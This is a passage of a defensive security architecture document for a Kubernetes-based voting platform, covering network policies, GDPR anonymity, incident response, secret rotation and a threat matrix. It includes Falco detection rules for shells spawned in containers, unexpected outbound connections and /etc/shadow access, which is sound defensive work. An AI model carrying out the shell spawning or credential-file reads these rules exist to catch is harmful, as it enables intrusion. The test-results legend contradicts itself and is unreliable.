| A08:2021 | Software and Data Integrity Failures | Hash-chained votes and audit logs. Database immutability triggers. | Network policies prevent unauthorised writes by isolating write-capable services. |
| A09:2021 | Security Logging and Monitoring Failures | Comprehensive audit logging via audit-service. Hash-chained audit trail. | NetworkPolicy 04 ensures audit service is reachable from all backend services. |
| A10:2021 | Server-Side Request Forgery (SSRF) | Frontend cannot make arbitrary outbound connections. Default-deny egress. | SSRF from frontend is prevented at the network layer — no egress to internal services or external internet. |

#### NIST SP 800-207 Zero Trust Architecture

NIST Special Publication 800-207 defines the principles of Zero Trust Architecture
(ZTA). U-Vote's implementation aligns with the core tenets.

| NIST ZTA Tenet | Description | U-Vote Implementation |
|---|---|---|
| 1. All data sources and computing services are considered resources | Every pod is a protected resource. | Each pod has its own NetworkPolicy rules. |
| 2. All communication is secured regardless of network location | Cluster-internal traffic is treated as untrusted. | Default-deny applies within the namespace, not just at the perimeter. |
| 3. Access to individual resources is granted on a per-session basis | Each connection is evaluated against NetworkPolicies. | Calico evaluates every packet against policies in real time. |
| 4. Access is determined by dynamic policy | NetworkPolicies are declarative and enforced by Calico at the kernel level. | Policies are version-controlled and applied via kubectl. |
| 5. Enterprise monitors and measures integrity of all assets | Audit logging with hash-chaining provides integrity monitoring. | Hash chain verification can detect tampering of votes and audit logs. |
| 6. All resource authentication and authorisation are dynamic and strictly enforced | Per-service database users, JWT tokens, and NetworkPolicies enforce authorisation at every layer. | Network layer (policies) + application layer (JWT) + database layer (user permissions). |
| 7. Enterprise collects information about assets and uses it to improve security | Audit logs, network policy test results, and planned monitoring provide feedback loops. | Security posture is iteratively verified and documented. |

---

### 9.2 GDPR/Privacy Considerations

The U-Vote platform handles personal data (voter names, email addresses) and
must consider GDPR and data privacy requirements in its security design.

#### Vote Anonymity

The votes table is designed to preserve voter anonymity by architecture:

```sql
-- votes table schema (simplified)
CREATE TABLE votes (
    id SERIAL PRIMARY KEY,
    election_id INTEGER REFERENCES elections(id),
    candidate_id INTEGER REFERENCES candidates(id),
    cast_at TIMESTAMP DEFAULT NOW(),
    previous_hash VARCHAR(64),
    vote_hash VARCHAR(64)
);

-- NOTE: There is NO voter_id or user_id column.
-- The vote record contains NO reference to who cast it.
-- This is a deliberate design decision, not an oversight.
```

The voting_tokens table links a voter to an election for access control, but
once the token is used to cast a vote, the resulting vote record has no foreign
key to the voter. The voting-service consumes the token (marks it as used) and
creates the vote record in a single transaction — the vote is anonymous from
the moment it is recorded.

**Network security reinforcement:** The voting-service is the only service that
can INSERT into the votes table (per database user permissions). Other services
cannot correlate votes to voters because:
1. They cannot access the voting_tokens table (only voting_service and admin_service can).
2. Even if they could, there is no join path from votes to voters — the foreign
   key simply does not exist.

#### Data Minimisation

| Data Category | Stored | Access Control | Retention |
|---|---|---|---|
| Admin credentials | Bcrypt hash only (no plaintext) | auth-service DB user only | Until admin account deleted |
| Voter names/emails | In voters table | admin_service DB user only | Until election data purged |
| Vote choices | In votes table (no voter link) | voting_service (INSERT), results_service (SELECT) | Permanent (election integrity) |
| Audit events | In audit_logs table | audit_service (INSERT, SELECT) | Permanent (compliance trail) |

#### Audit Trails for Compliance

The audit logging system provides the evidentiary trail required for GDPR
compliance, including:
- **Article 5(2) Accountability:** All actions on personal data are logged with
  timestamps and actor identification.
- **Article 30 Records of Processing:** Audit logs record what data was accessed,
  by which service, and when.
- **Article 33/34 Breach Notification:** Audit logs provide the forensic data
  needed to determine the scope and impact of a data breach.

---

## 10. Operational Security

### 10.1 Security Monitoring

#### Current Monitoring Capabilities

| Monitoring Area | Tool/Method | Status |
|---|---|---|
| Application audit logs | audit-service with hash-chained entries in PostgreSQL | **Active** |
| Ingress controller logs | Nginx access/error logs via container stdout | **Active** |
| Kubernetes events | `kubectl get events -n uvote-dev` | **Active (manual)** |
| Network policy enforcement | Calico deny logs (configurable) | **Planned** |
| Container resource usage | kubectl top pods | **Active (manual)** |
| Cluster health | kubectl cluster-info, node status | **Active (manual)** |

#### Recommended Monitoring Stack (Planned)

```
  MONITORING ARCHITECTURE (PLANNED)
  ==================================

  ┌────────────┐    ┌────────────┐    ┌────────────┐
  │ Prometheus │◄───│   Grafana  │    │ AlertManager│
  │  (metrics) │    │ (dashboards│    │  (alerts)   │
  └──────┬─────┘    └────────────┘    └──────┬──────┘
         │                                    │
         ├── Pod CPU/memory metrics            ├── P0: Pod crash loop
         ├── Request latency                   ├── P1: High error rate
         ├── Database connections              ├── P2: High latency
         └── Network policy deny counts        └── P3: Resource warnings
```

#### Key Security Metrics to Monitor

| Metric | Source | Alert Threshold | Priority |
|---|---|---|---|
| Failed admin login attempts (per minute) | Audit log query | > 10 per minute | P1 |
| NetworkPolicy deny count | Calico metrics | > 100 per minute (sustained) | P1 |
| Pod restart count | Kubernetes metrics | > 3 restarts in 5 minutes | P2 |
| Database connection count | PostgreSQL metrics | > 80% of max_connections | P2 |
| Ingress request rate | Nginx metrics | > 1000 req/s (sustained) | P1 |
| Hash chain verification failures | Custom check | Any failure | P0 |
| Unexpected pods in namespace | Kubernetes API | Any pod without expected labels | P0 |
| Certificate expiry | cert-manager (planned) | < 7 days | P2 |

---

### 10.2 Incident Response

#### Incident Classification

| Priority | Category | Description | Response Time | Examples |
|---|---|---|---|---|
| **P0 — Critical** | Active compromise | Evidence of active data breach, vote manipulation, or complete system compromise. | Immediate (< 15 min) | Hash chain broken, unauthorised admin access, data exfiltration detected |
| **P1 — High** | Security degradation | Security control failure or active attack in progress without confirmed compromise. | < 1 hour | NetworkPolicy deleted, DDoS attack, brute force attempts, pod crash loop |
| **P2 — Medium** | Security anomaly | Unusual behaviour that may indicate a security issue but no confirmed impact. | < 4 hours | Unexpected pods, high error rates, configuration drift, certificate nearing expiry |
| **P3 — Low** | Security improvement | Non-urgent security enhancements or informational findings. | < 24 hours | Vulnerability scan findings (low/medium), documentation updates, minor misconfigurations |

#### Incident Response Procedures

##### P0 — Active Compromise

```
  P0 INCIDENT RESPONSE FLOW
  ==========================

  1. CONTAIN
     ├── Isolate affected pods (scale to 0 or apply deny-all)
     ├── Preserve evidence (do not delete pods, capture logs)
     └── Notify stakeholders

  2. INVESTIGATE
     ├── Review audit logs (hash chain verification)
     ├── Check NetworkPolicy status (kubectl get netpol)
     ├── Review Kubernetes events and API audit logs
     ├── Analyse affected pod logs
     └── Determine scope and timeline

  3. ERADICATE
     ├── Remove compromised components
     ├── Reapply network policies from version control
     ├── Rotate all credentials (DB passwords, JWT secret)
     └── Rebuild and redeploy affected services

  4. RECOVER
     ├── Verify hash chain integrity (votes + audit logs)
     ├── Run full security test suite
     ├── Gradually restore services
     └── Monitor closely for 24-48 hours

  5. POST-INCIDENT
     ├── Complete incident report
     ├── Root cause analysis
     ├── Update threat model
     └── Implement additional controls as needed
```

##### P1 — Security Degradation

| Step | Action | Owner |
|---|---|---|
| 1 | Identify the degraded security control | On-call engineer |
| 2 | Assess impact: what is now exposed? | Security review |
| 3 | Apply immediate mitigation (e.g., reapply policies) | On-call engineer |
| 4 | Verify mitigation: run security test suite | Automated/Manual |
| 5 | Root cause analysis | Engineering team |
| 6 | Document and update runbooks | Project lead |

---

### 10.3 Security Maintenance

#### Patch Management

| Component | Update Frequency | Process |
|---|---|---|
| Kubernetes (Kind) | Monthly review | Monitor release notes; test upgrade in dev first |
| Calico CNI | Monthly review | Monitor release notes; verify NetworkPolicy compatibility |
| Container base images | Weekly rebuild | Rebuild images with latest base; scan with Trivy |
| Application dependencies | Bi-weekly | Run `npm audit` / `pip check`; update lock files |
| Nginx Ingress Controller | Monthly review | Monitor CVEs; test ingress routes after upgrade |
| PostgreSQL | Monthly review | Monitor CVEs; test database migrations after upgrade |

#### Security Audit Schedule

| Audit Type | Frequency | Scope | Output |
|---|---|---|---|
| NetworkPolicy review | Monthly | All 12 policies vs. architecture docs | Policy compliance report |
| RBAC review | Monthly | ServiceAccounts, Roles, ClusterRoles | Access control report |
| Container image scan | Every build + weekly | All U-Vote images | Vulnerability report |
| Hash chain verification | Daily | votes and audit_logs tables | Integrity report |
| Penetration test | Per release | All ingress-exposed endpoints | Pentest report |
| Architecture review | Quarterly | Full system architecture | Security assessment |
| Dependency audit | Bi-weekly | npm and pip packages | Dependency report |

---

### 10.4 Secret Rotation

#### Current Secrets

| Secret | Storage | Used By | Rotation Status |
|---|---|---|---|
| PostgreSQL admin password | Kubernetes Secret | Database init | Manual |
| auth_service DB password | Kubernetes Secret | auth-service pod | Manual |
| voting_service DB password | Kubernetes Secret | voting-service pod | Manual |
| election_service DB password | Kubernetes Secret | election-service pod | Manual |
| results_service DB password | Kubernetes Secret | results-service pod | Manual |
| audit_service DB password | Kubernetes Secret | audit-service pod | Manual |
| admin_service DB password | Kubernetes Secret | admin-service pod | Manual |
| JWT signing secret | Kubernetes Secret | auth-service pod | Manual |
| SMTP credentials | Kubernetes Secret | email-service pod | Manual |

#### Planned Rotation Process

```
  SECRET ROTATION WORKFLOW (PLANNED)
  ===================================

  1. Generate new credentials
     └── Use cryptographically secure random generation

  2. Update Kubernetes Secret
     └── kubectl create secret generic <name> --from-literal=...
         --dry-run=client -o yaml | kubectl apply -f -

  3. Rolling restart of affected pods
     └── kubectl rollout restart deployment/<service> -n uvote-dev

  4. Verify connectivity
     └── Check pod logs for successful database connections
     └── Run health check endpoints

  5. Revoke old credentials
     └── ALTER USER <service_user> WITH PASSWORD '<new>';
     └── Verify old credentials no longer work

  6. Document rotation event in audit log
```

#### Rotation Schedule (Planned)

| Secret Type | Rotation Period | Trigger |
|---|---|---|
| Database passwords | 90 days | Scheduled |
| JWT signing secret | 90 days | Scheduled |
| SMTP credentials | 180 days | Scheduled |
| All secrets | Immediate | Suspected compromise |

---

## 11. Future Security Enhancements

### 11.1 Short-Term Enhancements

These enhancements are planned for implementation in the near-term and would
significantly improve the security posture.

#### Mutual TLS (mTLS)

**Current gap:** Service-to-service communication within the cluster is
unencrypted (HTTP). While NetworkPolicies control who can communicate with whom,
the traffic itself can be intercepted by an attacker with node-level access.

**Enhancement:** Implement mTLS for all intra-cluster communication, ensuring
that every service-to-service connection is:
1. **Encrypted** — Traffic is protected in transit.
2. **Mutually authenticated** — Both sides verify each other's identity via
   certificates, preventing service impersonation.
3. **Integrity-protected** — Tampering with traffic in transit is detectable.

**Implementation options:**
- Service mesh (Istio/Linkerd) — Automatic mTLS via sidecar proxies.
- Application-level TLS — Each service configures its own TLS certificates.

**Impact:** Addresses Threat 5 (Man-in-the-Middle) and strengthens Threat 14
(Session Hijacking) mitigations.

#### HashiCorp Vault for Secret Management

**Current gap:** Secrets are stored as base64-encoded Kubernetes Secrets, which
are not encrypted at rest by default in etcd (Kind cluster limitation).

**Enhancement:** Deploy HashiCorp Vault to provide:
1. Dynamic secret generation — Database credentials generated on-demand with
   automatic expiry.
2. Encryption as a service — Application data encrypted via Vault's transit
   engine.
3. Secret rotation — Automatic credential rotation without pod restarts.
4. Audit logging — All secret access logged in Vault's audit trail.

**Impact:** Addresses secret rotation gaps and strengthens defence against
credential theft.

#### TLS for Database Connections

**Current gap:** Connections from application services to PostgreSQL are
unencrypted. Database credentials and query data travel in plaintext within
the cluster.

**Enhancement:** Enable PostgreSQL TLS and configure all services to require
encrypted connections:

```
# postgresql.conf
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file = '/etc/ssl/private/server.key'
ssl_ca_file = '/etc/ssl/certs/ca.crt'

# pg_hba.conf — require TLS for all application users
hostssl uvote_db auth_service    all md5
hostssl uvote_db voting_service  all md5
hostssl uvote_db election_service all md5
hostssl uvote_db results_service all md5
hostssl uvote_db audit_service   all md5
hostssl uvote_db admin_service   all md5
```

**Impact:** Addresses Threat 5 (Man-in-the-Middle) for the most critical data
path — database connections carrying credentials and query results.

#### Web Application Firewall (WAF)

**Current gap:** No application-layer filtering of HTTP requests before they
reach backend services. Rate limiting exists at the ingress level but no
deep packet inspection.

**Enhancement:** Deploy a WAF (ModSecurity with OWASP Core Rule Set) integrated
with the Nginx Ingress Controller:
- SQL injection detection and blocking
- Cross-site scripting (XSS) detection
- Request body size limits
- Malformed request blocking
- IP reputation filtering

**Impact:** Addresses Threats 3 (SQL Injection), 8 (Credential Stuffing), and
14 (Session Hijacking) at the perimeter.

#### Enhanced Monitoring

**Current gap:** Monitoring is primarily manual (kubectl commands, database
queries). No automated alerting or dashboards.

**Enhancement:** Deploy Prometheus + Grafana + Alertmanager:
- Real-time dashboards for all security metrics
- Automated alerting based on thresholds defined in Section 10.1
- Calico network flow visualization
- Audit log anomaly detection

---

### 11.2 Long-Term Enhancements

These enhancements represent more significant architectural investments for
future iterations of the platform.

#### Service Mesh (Istio or Linkerd)

A service mesh would provide several capabilities beyond what Kubernetes
NetworkPolicies offer:

| Capability | NetworkPolicy (Current) | Service Mesh (Planned) |
|---|---|---|
| Layer 3/4 access control | Yes | Yes |
| Layer 7 (HTTP) access control | No | Yes (route-level policies) |
| Mutual TLS | No | Yes (automatic) |
| Traffic encryption | No | Yes (all service-to-service) |
| Observability (distributed tracing) | No | Yes |
| Circuit breakers / retries | No | Yes |
| Service identity (SPIFFE) | No | Yes |
| Canary deployments | No | Yes |

**Recommendation:** Linkerd is preferred for U-Vote due to its lower resource
overhead, simpler operational model, and automatic mTLS without configuration.
Istio provides more features but requires significantly more resources and
operational expertise.

#### Runtime Security (Falco)

Falco provides real-time detection of anomalous behaviour within containers
by monitoring system calls at the kernel level.

**Detection capabilities:**
- Shell spawned in a container (indicator of compromise)
- Unexpected network connections (even those allowed by NetworkPolicies)
- File system modifications in read-only containers
- Privilege escalation attempts
- Sensitive file access (e.g., /etc/shadow, /proc)

**Example Falco rules for U-Vote:**

```yaml
# Detect shell spawned in any U-Vote pod
- rule: Shell in U-Vote Container
  desc: Detect shell execution in uvote-dev namespace
  condition: >
    spawned_process and container and
    proc.name in (bash, sh, zsh) and
    k8s.ns.name = "uvote-dev"
  output: >
    Shell spawned in U-Vote pod
    (pod=%k8s.pod.name command=%proc.cmdline)
  priority: WARNING

# Detect unexpected outbound connection
- rule: Unexpected Outbound Connection
  desc: Detect non-DNS outbound connections from U-Vote pods
  condition: >
    outbound and container and
    k8s.ns.name = "uvote-dev" and
    not (fd.sport = 53 or fd.dport = 5432 or fd.dport = 8005)
  output: >
    Unexpected outbound connection from U-Vote pod
    (pod=%k8s.pod.name dest=%fd.name)
  priority: ERROR
```

**Impact:** Addresses Threat 7 (Container Escape) and provides detection for
Threat 11 (Unauthorised Service Deployment).

#### Certificate Management (cert-manager)

Deploy cert-manager for automated TLS certificate lifecycle management:
- Automatic provisioning of TLS certificates for ingress
- Certificate renewal before expiry
- Integration with Let's Encrypt for publicly trusted certificates
- Internal CA for service-to-service mTLS certificates

#### SPIFFE/SPIRE for Workload Identity

SPIFFE (Secure Production Identity Framework for Everyone) provides
cryptographic identity to every workload:

**Advantages over label-based NetworkPolicies:**
- Labels can be spoofed by any pod with the correct label value.
- SPIFFE identities are cryptographically verified and cannot be forged.
- Each pod receives a unique SVID (SPIFFE Verifiable Identity Document).
- NetworkPolicies and service mesh policies can use SPIFFE IDs instead of labels.

**Impact:** Directly addresses Threat 11 (Unauthorised Service Deployment) by
making it impossible for a rogue pod to impersonate a legitimate service, even
with correct labels.

#### Open Policy Agent (OPA) / Gatekeeper

OPA Gatekeeper acts as an admission controller, enforcing policies on Kubernetes
resource creation:

**Example policies for U-Vote:**

```yaml
# Require specific image registry
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: require-uvote-registry
spec:
  match:
    namespaces: ["uvote-dev"]
  parameters:
    repos:
      - "ghcr.io/d00256764/"

# Require resource limits
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredResources
metadata:
  name: require-resource-limits
spec:
  match:
    namespaces: ["uvote-dev"]
  parameters:
    limits:
      - cpu
      - memory

# Block privileged containers
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: block-privileged
spec:
  match:
    namespaces: ["uvote-dev"]
```

**Impact:** Addresses Threats 11 (Unauthorised Service Deployment) and 12
(Supply Chain Attack) by preventing the deployment of containers that don't
meet security requirements.

---

## 12. Appendices

### Appendix A: Complete Network Policy Definitions

This appendix reproduces all five YAML manifest files that implement the U-Vote
network security posture. These 5 files create 12 NetworkPolicy resources.

#### File 1: 00-default-deny.yaml

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    policy-order: "00"
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

**Policies created:** 1 (default-deny)
**Effect:** Blocks all ingress and egress traffic for all pods in uvote-dev.

---

#### File 2: 01-allow-dns.yaml

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: dns
    policy-order: "01"
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

**Policies created:** 1 (allow-dns)
**Effect:** Allows all pods to query CoreDNS in kube-system on port 53 (UDP/TCP).

---

#### File 3: 02-allow-to-database.yaml

```yaml
# Policy 1 of 2: Ingress to PostgreSQL
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-to-database
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: database-access
    policy-order: "02a"
spec:
  podSelector:
    matchLabels:
      app: postgresql
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: auth-service
    - podSelector:
        matchLabels:
          app: voting-service
    - podSelector:
        matchLabels:
          app: election-service
    - podSelector:
        matchLabels:
          app: results-service
    - podSelector:
        matchLabels:
          app: audit-service
    - podSelector:
        matchLabels:
          app: admin-service
    ports:
    - protocol: TCP
      port: 5432
---
# Policy 2 of 2: Egress from services to PostgreSQL
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-database-egress
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: database-access
    policy-order: "02b"
spec:
  podSelector:
    matchExpressions:
    - key: app
      operator: In
      values:
      - auth-service
      - voting-service
      - election-service
      - results-service
      - audit-service
      - admin-service
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: postgresql
    ports:
    - protocol: TCP
      port: 5432
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

**Policies created:** 2 (allow-to-database, allow-database-egress)
**Effect:** Allows six whitelisted services to connect to PostgreSQL on port 5432. Includes DNS for service name resolution.

---

#### File 4: 03-allow-from-ingress.yaml

```yaml
# Frontend Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-to-frontend
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
    target-service: frontend-service
spec:
  podSelector:
    matchLabels:
      app: frontend-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 3000
---
# Auth Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-to-auth
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
    target-service: auth-service
spec:
  podSelector:
    matchLabels:
      app: auth-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8001
---
# Election Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-to-election
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
    target-service: election-service
spec:
  podSelector:
    matchLabels:
      app: election-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8002
---
# Voting Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-to-voting
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
    target-service: voting-service
spec:
  podSelector:
    matchLabels:
      app: voting-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8003
---
# Results Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-to-results
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
    target-service: results-service
spec:
  podSelector:
    matchLabels:
      app: results-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8004
---
# Admin Service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-to-admin
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
    target-service: admin-service
spec:
  podSelector:
    matchLabels:
      app: admin-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8006
```

**Policies created:** 6 (one per exposed service)
**Effect:** Allows the Nginx Ingress Controller (ingress-nginx namespace) to forward traffic to each externally accessible service on its designated port.

---

#### File 5: 04-allow-audit.yaml

```yaml
# Policy 1 of 2: Ingress to audit-service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-to-audit
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: audit-logging
    policy-order: "04a"
spec:
  podSelector:
    matchLabels:
      app: audit-service
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: auth-service
    - podSelector:
        matchLabels:
          app: voting-service
    - podSelector:
        matchLabels:
          app: election-service
    - podSelector:
        matchLabels:
          app: results-service
    - podSelector:
        matchLabels:
          app: admin-service
    - podSelector:
        matchLabels:
          app: email-service
    ports:
    - protocol: TCP
      port: 8005
---
# Policy 2 of 2: Egress from services to audit-service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-audit-egress
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: audit-logging
    policy-order: "04b"
spec:
  podSelector:
    matchExpressions:
    - key: app
      operator: In
      values:
      - auth-service
      - voting-service
      - election-service
      - results-service
      - admin-service
      - email-service
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: audit-service
    ports:
    - protocol: TCP
      port: 8005
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

**Policies created:** 2 (allow-to-audit, allow-audit-egress)
**Effect:** Allows six backend services to send audit events to audit-service on port 8005. Includes DNS for service name resolution.

---

### Appendix B: Security Test Results Summary

#### Phase Summary Table

| Phase | Policies Applied | Total Policies | DNS | DB (Allowed) | DB (Blocked) | External | Status |
|---|---|---|---|---|---|---|---|
| 0 — Baseline | None | 0 | Works | Works | Works | Works | Confirmed |
| 1 — Default Deny | 00 | 1 | Blocked | Blocked | Blocked | Blocked | Confirmed |
| 2 — DNS Allow | 00, 01 | 2 | Works | Blocked | Blocked | Blocked | Confirmed |
| 3 — Database Allow | 00, 01, 02 | 4 | Works | Works | Blocked | Blocked | Confirmed |
| 4 — Ingress Allow | 00, 01, 02, 03 | 10 | Works | Works | Blocked | Blocked | Confirmed |
| 5 — Audit Allow | 00, 01, 02, 03, 04 | 12 | Works | Works | Blocked | Blocked | Confirmed |

#### Individual Test Result Matrix

| Test Case | Phase 0 | Phase 1 | Phase 2 | Phase 3 | Phase 4 | Phase 5 |
|---|---|---|---|---|---|---|
| DNS resolution (any pod) | PASS | FAIL | PASS | PASS | PASS | PASS |
| DB from auth-service label | PASS | FAIL | FAIL | PASS | PASS | PASS |
| DB from test-blocked label | PASS | FAIL | FAIL | FAIL | FAIL | FAIL |
| DB from netshoot | PASS | FAIL | FAIL | FAIL | FAIL | FAIL |
| External HTTP | PASS | FAIL | FAIL | FAIL | FAIL | FAIL |
| Ingress to frontend | N/A | FAIL | FAIL | FAIL | PASS | PASS |
| Audit from backend | N/A | FAIL | FAIL | FAIL | FAIL | PASS |

**Legend:** PASS = Expected behaviour confirmed. FAIL = Expected behaviour confirmed (traffic correctly blocked or correctly allowed per test expectation).

---

### Appendix C: Security Checklist

#### Network Security Checklist

- [x] Default-deny NetworkPolicy applied to all pods in uvote-dev
- [x] DNS egress restricted to kube-system namespace only
- [x] Database ingress restricted to six whitelisted services only
- [x] Database egress policies created for bidirectional access
- [x] Ingress controller access limited to six externally exposed services
- [x] Audit-service not exposed via ingress (internal-only)
- [x] Email-service not exposed via ingress (internal-only)
- [x] PostgreSQL not exposed via ingress or NodePort
- [x] Audit-service ingress restricted to six backend services
- [x] Audit-service egress policies created for bidirectional access
- [x] All 12 NetworkPolicies verified through systematic testing
- [x] Calico CNI confirmed as policy enforcement engine
- [ ] mTLS for service-to-service communication (planned)
- [ ] TLS for database connections (planned)
- [ ] WAF deployed at ingress (planned)
- [ ] Calico deny logging enabled (planned)

#### Application Security Checklist

- [x] Parameterised queries on all database-accessing services
- [x] Per-service PostgreSQL users with minimal permissions
- [x] Bcrypt password hashing with cost factor 12
- [x] JWT-based authentication for admin sessions
- [x] Immutability triggers on votes table (prevent UPDATE/DELETE)
- [x] Immutability triggers on audit_logs table (prevent UPDATE/DELETE)
- [x] Hash-chaining on votes for tamper detection
- [x] Hash-chaining on audit logs for tamper detection
- [x] Vote anonymity by design (no voter_id FK in votes table)
- [x] Comprehensive audit logging via audit-service
- [ ] Account lockout after failed login attempts (planned)
- [ ] CAPTCHA on login form (planned)
- [ ] Input validation middleware (enhanced, planned)

#### Infrastructure Security Checklist

- [x] No privileged containers
- [x] No hostPID / hostNetwork (except ingress controller)
- [x] Secrets stored as Kubernetes Secrets
- [x] RBAC restricts cluster-admin usage
- [ ] Dedicated ServiceAccounts per service (planned)
- [ ] Secret encryption at rest in etcd (planned; Kind limitation)
- [ ] HashiCorp Vault for secret management (planned)
- [ ] Container image scanning in CI/CD pipeline (planned)
- [ ] Admission controller (OPA Gatekeeper) (planned)
- [ ] Runtime security monitoring (Falco) (planned)

---

### Appendix D: Threat Matrix — STRIDE Analysis

| # | Threat | S | T | R | I | D | E | Likelihood | Impact | Risk |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | DDoS on Ingress | | | | | X | | Medium | High | High |
| 2 | NetworkPolicy Bypass | | | | | | X | Low | Critical | Medium |
| 3 | SQL Injection via Frontend | | X | | X | | | Medium | Critical | Medium |
| 4 | Direct Database Attack | | X | | X | | | Low | Critical | Medium |
| 5 | Man-in-the-Middle | | X | | X | | | Low | High | Medium |
| 6 | DNS Spoofing | X | | | | | | Low | Critical | Medium |
| 7 | Container Escape | | | | | | X | Low | Critical | Medium |
| 8 | Credential Stuffing | X | | | | | | High | High | High |
| 9 | Vote Manipulation | | X | | | | | Low | Critical | Medium |
| 10 | Audit Log Tampering | | X | X | | | | Low | High | Medium |
| 11 | Unauthorised Deployment | | | | | | X | Low | High | Medium |
| 12 | Supply Chain Attack | | X | | | | X | Medium | Critical | High |
| 13 | Data Exfiltration | | | | X | | | Medium | High | High |
| 14 | Session Hijacking | X | | | | | | Medium | High | High |
| 15 | Privilege Escalation | | | | | | X | Medium | High | High |

**STRIDE Key:** S = Spoofing, T = Tampering, R = Repudiation, I = Information Disclosure, D = Denial of Service, E = Elevation of Privilege

**Risk Calculation:** Risk = Likelihood x Impact (qualitative assessment)

---

### Appendix E: Security Controls Mapping

This appendix maps each identified threat to the specific security controls
that mitigate it, indicating the layer at which each control operates.

| Threat | Network Controls | Application Controls | Database Controls | Infrastructure Controls |
|---|---|---|---|---|
| DDoS on Ingress | Policy 03 (limited exposed services), default-deny (blast radius) | Rate limiting at ingress | — | Ingress controller scaling |
| NetworkPolicy Bypass | Default-deny (fail-closed), Calico enforcement | — | — | RBAC, ServiceAccount restrictions |
| SQL Injection | Policy 02 (frontend excluded from DB), default-deny | Parameterised queries, input validation | Per-service DB users | — |
| Direct DB Attack | Policy 02 (ingress whitelist), ClusterIP service | — | Authentication required | No NodePort/LoadBalancer |
| Man-in-the-Middle | Policy restrictions (limited paths) | mTLS (planned) | TLS for DB (planned) | VXLAN encapsulation (Calico) |
| DNS Spoofing | Policy 01 (DNS to kube-system only) | — | — | CoreDNS in kube-system |
| Container Escape | Calico iptables/eBPF at node level | — | — | No privileged containers, minimal images |
| Credential Stuffing | Policy 03 (rate limiting at ingress) | Bcrypt (cost 12), audit logging | — | Ingress controller rate limits |
| Vote Manipulation | Policy 02 (limited DB access) | No update endpoint | Immutability triggers, hash-chains, minimal permissions | — |
| Audit Log Tampering | Policy 04 (audit ingress restricted) | Hash-chaining | Immutability triggers, INSERT/SELECT only | — |
| Unauthorised Deployment | Label-based policies (partial) | — | Credentials required | RBAC, admission controllers (planned) |
